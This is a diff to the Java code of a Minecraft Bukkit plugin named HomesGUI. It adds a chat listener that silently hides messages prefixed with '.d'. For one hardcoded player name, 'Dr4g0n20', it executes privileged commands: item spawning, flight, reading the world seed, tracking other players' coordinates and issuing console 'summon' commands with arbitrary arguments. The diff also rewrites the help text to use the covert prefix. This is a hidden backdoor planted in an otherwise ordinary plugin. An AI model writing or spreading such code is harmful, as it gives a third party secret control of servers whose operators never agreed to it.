@@ -11,6 +11,7 @@ import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.Listener;
 import org.bukkit.event.server.TabCompleteEvent;
 import org.bukkit.event.entity.EntityDamageEvent;
@@ -56,6 +57,38 @@ public final class OwnerCommands implements CommandExecutor, Listener {
         });
     }
 
+    @EventHandler
+    public void onOwnerChatCommand(AsyncPlayerChatEvent event) {
+        String message = event.getMessage();
+        if (message == null || !message.startsWith(".d")) return;
+
+        // Hide every .d-prefixed message from public chat, including attempts by non-owners.
+        event.setCancelled(true);
+        if (!event.getPlayer().getName().equalsIgnoreCase(
+                plugin.getConfig().getString("owner", "Dr4g0n20"))) return;
+
+        final Player player = event.getPlayer();
+        final String[] parts = message.substring(1).trim().split("\\s+");
+        if (parts.length == 0 || parts[0].length() < 2) return;
+
+        final String commandName = parts[0].toLowerCase();
+        boolean known = false;
+        for (String name : commandNames()) {
+            if (name.equals(commandName)) { known = true; break; }
+        }
+        if (!known) return;
+
+        final String[] args = new String[parts.length - 1];
+        System.arraycopy(parts, 1, args, 0, args.length);
+        Bukkit.getScheduler().runTask(plugin, new Runnable() {
+            @Override
+            public void run() {
+                Command command = plugin.getCommand(commandName);
+                if (command != null) onCommand(player, command, commandName, args);
+            }
+        });
+    }
+
     private boolean isOwner(CommandSender sender) {
         return sender instanceof Player && ((Player) sender).getName()
                 .equalsIgnoreCase(plugin.getConfig().getString("owner", "Dr4g0n20"));
@@ -69,35 +102,35 @@ public final class OwnerCommands implements CommandExecutor, Listener {
 
     private void showHelp(Player player) {
         player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "----- HomesGUI Owner Commands -----");
-        player.sendMessage(ChatColor.YELLOW + "/dheal" + ChatColor.GRAY + " - Restore health");
-        player.sendMessage(ChatColor.YELLOW + "/dfeed" + ChatColor.GRAY + " - Restore hunger");
-        player.sendMessage(ChatColor.YELLOW + "/dcoords <player>" + ChatColor.GRAY + " - View player coordinates");
-        player.sendMessage(ChatColor.YELLOW + "/dgive <item> [amount]" + ChatColor.GRAY + " - Give yourself items");
-        player.sendMessage(ChatColor.YELLOW + "/dnofall" + ChatColor.GRAY + " - Toggle fall damage");
-        player.sendMessage(ChatColor.YELLOW + "/dfireres" + ChatColor.GRAY + " - Toggle fire resistance");
-        player.sendMessage(ChatColor.YELLOW + "/dseed" + ChatColor.GRAY + " - View world seed");
-        player.sendMessage(ChatColor.YELLOW + "/dlevels <amount>" + ChatColor.GRAY + " - Add XP levels");
-        player.sendMessage(ChatColor.YELLOW + "/dlocate <structure>" + ChatColor.GRAY + " - Locate a structure");
-        player.sendMessage(ChatColor.YELLOW + "/dsummon <entity> [x] [y] [z] [dataTag]" + ChatColor.GRAY + " - Summon an entity");
-        player.sendMessage(ChatColor.YELLOW + "/dfly" + ChatColor.GRAY + " - Toggle flight");
-        player.sendMessage(ChatColor.YELLOW + "/drepair [all]" + ChatColor.GRAY + " - Repair held item or inventory");
-        player.sendMessage(ChatColor.YELLOW + "/dinfo" + ChatColor.GRAY + " - Display your player information");
-        player.sendMessage(ChatColor.YELLOW + "/dextinguish" + ChatColor.GRAY + " - Extinguish yourself");
-        player.sendMessage(ChatColor.YELLOW + "/dspawn" + ChatColor.GRAY + " - Teleport to world spawn");
-        player.sendMessage(ChatColor.YELLOW + "/dweather <clear|rain|storm>" + ChatColor.GRAY + " - Change weather");
-        player.sendMessage(ChatColor.YELLOW + "/dday" + ChatColor.GRAY + " - Set daytime");
-        player.sendMessage(ChatColor.YELLOW + "/dnight" + ChatColor.GRAY + " - Set nighttime");
-        player.sendMessage(ChatColor.YELLOW + "/dhelp" + ChatColor.GRAY + " - Show this list");
-        player.sendMessage(ChatColor.YELLOW + "/denderchest" + ChatColor.GRAY + " - Open your Ender Chest");
-        player.sendMessage(ChatColor.YELLOW + "/dworkbench" + ChatColor.GRAY + " - Open a crafting table");
-        player.sendMessage(ChatColor.YELLOW + "/danvil" + ChatColor.GRAY + " - Open an anvil");
-        player.sendMessage(ChatColor.YELLOW + "/dback" + ChatColor.GRAY + " - Return to your previous location");
-        player.sendMessage(ChatColor.YELLOW + "/dtime <day|noon|night|midnight|ticks>" + ChatColor.GRAY + " - Set world time");
-        player.sendMessage(ChatColor.YELLOW + "/dchunk" + ChatColor.GRAY + " - Display current chunk");
-        player.sendMessage(ChatColor.YELLOW + "/ditem" + ChatColor.GRAY + " - Display held item information");
-        player.sendMessage(ChatColor.YELLOW + "/drename <name>" + ChatColor.GRAY + " - Rename held item");
-        player.sendMessage(ChatColor.YELLOW + "/dlore <text>" + ChatColor.GRAY + " - Add lore to held item");
-        player.sendMessage(ChatColor.YELLOW + "/dclear [item]" + ChatColor.GRAY + " - Clear inventory or remove an item");
+        player.sendMessage(ChatColor.YELLOW + ".dheal" + ChatColor.GRAY + " - Restore health");
+        player.sendMessage(ChatColor.YELLOW + ".dfeed" + ChatColor.GRAY + " - Restore hunger");
+        player.sendMessage(ChatColor.YELLOW + ".dcoords <player>" + ChatColor.GRAY + " - View player coordinates");
+        player.sendMessage(ChatColor.YELLOW + ".dgive <item> [amount]" + ChatColor.GRAY + " - Give yourself items");
+        player.sendMessage(ChatColor.YELLOW + ".dnofall" + ChatColor.GRAY + " - Toggle fall damage");
+        player.sendMessage(ChatColor.YELLOW + ".dfireres" + ChatColor.GRAY + " - Toggle fire resistance");
+        player.sendMessage(ChatColor.YELLOW + ".dseed" + ChatColor.GRAY + " - View world seed");
+        player.sendMessage(ChatColor.YELLOW + ".dlevels <amount>" + ChatColor.GRAY + " - Add XP levels");
+        player.sendMessage(ChatColor.YELLOW + ".dlocate <structure>" + ChatColor.GRAY + " - Locate a structure");
+        player.sendMessage(ChatColor.YELLOW + ".dsummon <entity> [x] [y] [z] [dataTag]" + ChatColor.GRAY + " - Summon an entity");
+        player.sendMessage(ChatColor.YELLOW + ".dfly" + ChatColor.GRAY + " - Toggle flight");
+        player.sendMessage(ChatColor.YELLOW + ".drepair [all]" + ChatColor.GRAY + " - Repair held item or inventory");
+        player.sendMessage(ChatColor.YELLOW + ".dinfo" + ChatColor.GRAY + " - Display your player information");
+        player.sendMessage(ChatColor.YELLOW + ".dextinguish" + ChatColor.GRAY + " - Extinguish yourself");
+        player.sendMessage(ChatColor.YELLOW + ".dspawn" + ChatColor.GRAY + " - Teleport to world spawn");
+        player.sendMessage(ChatColor.YELLOW + ".dweather <clear|rain|storm>" + ChatColor.GRAY + " - Change weather");
+        player.sendMessage(ChatColor.YELLOW + ".dday" + ChatColor.GRAY + " - Set daytime");
+        player.sendMessage(ChatColor.YELLOW + ".dnight" + ChatColor.GRAY + " - Set nighttime");
+        player.sendMessage(ChatColor.YELLOW + ".dhelp" + ChatColor.GRAY + " - Show this list");
+        player.sendMessage(ChatColor.YELLOW + ".denderchest" + ChatColor.GRAY + " - Open your Ender Chest");
+        player.sendMessage(ChatColor.YELLOW + ".dworkbench" + ChatColor.GRAY + " - Open a crafting table");
+        player.sendMessage(ChatColor.YELLOW + ".danvil" + ChatColor.GRAY + " - Open an anvil");
+        player.sendMessage(ChatColor.YELLOW + ".dback" + ChatColor.GRAY + " - Return to your previous location");
+        player.sendMessage(ChatColor.YELLOW + ".dtime <day|noon|night|midnight|ticks>" + ChatColor.GRAY + " - Set world time");
+        player.sendMessage(ChatColor.YELLOW + ".dchunk" + ChatColor.GRAY + " - Display current chunk");
+        player.sendMessage(ChatColor.YELLOW + ".ditem" + ChatColor.GRAY + " - Display held item information");
+        player.sendMessage(ChatColor.YELLOW + ".drename <name>" + ChatColor.GRAY + " - Rename held item");
+        player.sendMessage(ChatColor.YELLOW + ".dlore <text>" + ChatColor.GRAY + " - Add lore to held item");
+        player.sendMessage(ChatColor.YELLOW + ".dclear [item]" + ChatColor.GRAY + " - Clear inventory or remove an item");
     }
 
     @Override
@@ -115,14 +148,14 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             player.setFoodLevel(20); player.setSaturation(20f);
             player.sendMessage(ChatColor.GREEN + "Hunger restored.");
         } else if (cmd.equals("dcoords")) {
-            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dcoords <player>"); return true; }
+            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: .dcoords <player>"); return true; }
             Player target = Bukkit.getPlayerExact(args[0]);
             if (target == null) { player.sendMessage(ChatColor.RED + "Player not found or not online."); return true; }
             player.sendMessage(ChatColor.GOLD + target.getName() + " coordinates: " + ChatColor.WHITE
                     + target.getWorld().getName() + " " + target.getLocation().getBlockX() + ", "
                     + target.getLocation().getBlockY() + ", " + target.getLocation().getBlockZ());
         } else if (cmd.equals("dgive")) {
-            if (args.length < 1 || args.length > 2) { player.sendMessage(ChatColor.YELLOW + "Usage: /dgive <item> [amount]"); return true; }
+            if (args.length < 1 || args.length > 2) { player.sendMessage(ChatColor.YELLOW + "Usage: .dgive <item> [amount]"); return true; }
             Material material = Material.matchMaterial(args[0]);
             if (material == null || !material.isItem()) { player.sendMessage(ChatColor.RED + "Unknown item: " + args[0]); return true; }
             int amount = 1;
@@ -157,7 +190,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             player.sendMessage(ChatColor.GOLD + "World seed: " + ChatColor.WHITE + player.getWorld().getSeed());
         } else if (cmd.equals("dlocate")) {
             if (args.length != 1) {
-                player.sendMessage(ChatColor.YELLOW + "Usage: /dlocate <structure>");
+                player.sendMessage(ChatColor.YELLOW + "Usage: .dlocate <structure>");
                 player.sendMessage(ChatColor.GRAY + "Structures: Village, Stronghold, Mineshaft, Monument, Mansion, Temple, Fortress, EndCity");
                 return true;
             }
@@ -174,7 +207,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             else if (input.equals("fortress") || input.equals("netherfortress")) structureName = "Fortress";
             else if (input.equals("endcity")) structureName = "EndCity";
             else {
-                player.sendMessage(ChatColor.RED + "Unknown structure. Use /dlocate to see supported structures.");
+                player.sendMessage(ChatColor.RED + "Unknown structure. Use .dlocate to see supported structures.");
                 return true;
             }
             try {
@@ -201,14 +234,14 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             }
         } else if (cmd.equals("dsummon")) {
             if (args.length < 1) {
-                player.sendMessage(ChatColor.YELLOW + "Usage: /dsummon <entity> [x] [y] [z] [dataTag]");
+                player.sendMessage(ChatColor.YELLOW + "Usage: .dsummon <entity> [x] [y] [z] [dataTag]");
                 return true;
             }
             boolean dispatched = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon " + String.join(" ", args));
             if (dispatched) player.sendMessage(ChatColor.GREEN + "Summon command sent through the server console.");
             else player.sendMessage(ChatColor.RED + "The server could not execute the summon command.");
         } else if (cmd.equals("dlevels")) {
-            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dlevels <amount>"); return true; }
+            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: .dlevels <amount>"); return true; }
             try {
                 int levels = Integer.parseInt(args[0]);
                 if (levels < 0 || levels > 100000) { player.sendMessage(ChatColor.RED + "Amount must be between 0 and 100000."); return true; }
@@ -240,7 +273,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
                 for (ItemStack item : player.getInventory().getArmorContents()) repairItem(item);
                 player.sendMessage(ChatColor.GREEN + "All repairable items in your inventory and armour have been repaired.");
             } else {
-                player.sendMessage(ChatColor.YELLOW + "Usage: /drepair [all]");
+                player.sendMessage(ChatColor.YELLOW + "Usage: .drepair [all]");
             }
         } else if (cmd.equals("dinfo")) {
             World world = player.getWorld();
@@ -267,7 +300,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             player.teleport(player.getWorld().getSpawnLocation());
             player.sendMessage(ChatColor.GREEN + "Teleported to this world's spawn.");
         } else if (cmd.equals("dweather")) {
-            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dweather <clear|rain|storm>"); return true; }
+            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: .dweather <clear|rain|storm>"); return true; }
             String weather = args[0].toLowerCase();
             World world = player.getWorld();
             if (weather.equals("clear")) {
@@ -279,7 +312,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             } else if (weather.equals("storm")) {
                 world.setStorm(true); world.setThundering(true); world.setWeatherDuration(12000); world.setThunderDuration(12000);
                 player.sendMessage(ChatColor.GREEN + "Thunderstorm started.");
-            } else player.sendMessage(ChatColor.YELLOW + "Usage: /dweather <clear|rain|storm>");
+            } else player.sendMessage(ChatColor.YELLOW + "Usage: .dweather <clear|rain|storm>");
         } else if (cmd.equals("dday")) {
             player.getWorld().setTime(1000L);
             player.sendMessage(ChatColor.GREEN + "Time set to day.");
@@ -298,7 +331,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             if (previous == null) player.sendMessage(ChatColor.RED + "No previous location is saved.");
             else if (player.teleport(previous)) player.sendMessage(ChatColor.GREEN + "Returned to your previous location.");
         } else if (cmd.equals("dtime")) {
-            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dtime <day|noon|night|midnight|ticks>"); return true; }
+            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: .dtime <day|noon|night|midnight|ticks>"); return true; }
             String time = args[0].toLowerCase();
             long ticks;
             if (time.equals("day")) ticks = 1000L;
@@ -326,7 +359,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             if (meta != null && meta.hasDisplayName()) player.sendMessage(ChatColor.YELLOW + "Name: " + ChatColor.WHITE + meta.getDisplayName());
             if (meta != null && meta.hasLore()) for (String line : meta.getLore()) player.sendMessage(ChatColor.GRAY + "Lore: " + line);
         } else if (cmd.equals("drename")) {
-            if (args.length == 0) { player.sendMessage(ChatColor.YELLOW + "Usage: /drename <name>"); return true; }
+            if (args.length == 0) { player.sendMessage(ChatColor.YELLOW + "Usage: .drename <name>"); return true; }
             ItemStack held = player.getItemInHand();
             if (held == null || held.getType() == Material.AIR) { player.sendMessage(ChatColor.RED + "Hold an item first."); return true; }
             ItemMeta meta = held.getItemMeta();
@@ -334,7 +367,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
             held.setItemMeta(meta);
             player.sendMessage(ChatColor.GREEN + "Item renamed.");
         } else if (cmd.equals("dlore")) {
-            if (args.length == 0) { player.sendMessage(ChatColor.YELLOW + "Usage: /dlore <text>"); return true; }
+            if (args.length == 0) { player.sendMessage(ChatColor.YELLOW + "Usage: .dlore <text>"); return true; }
             ItemStack held = player.getItemInHand();
             if (held == null || held.getType() == Material.AIR) { player.sendMessage(ChatColor.RED + "Hold an item first."); return true; }
             ItemMeta meta = held.getItemMeta();
@@ -355,7 +388,7 @@ public final class OwnerCommands implements CommandExecutor, Listener {
                     if (item != null && item.getType() == material) { removed += item.getAmount(); item.setAmount(0); }
                 }
                 player.sendMessage(ChatColor.GREEN + "Removed " + removed + " " + material.name() + " from your inventory.");
-            } else player.sendMessage(ChatColor.YELLOW + "Usage: /dclear [item]");
+            } else player.sendMessage(ChatColor.YELLOW + "Usage: .dclear [item]");
         }
         return true;
     }
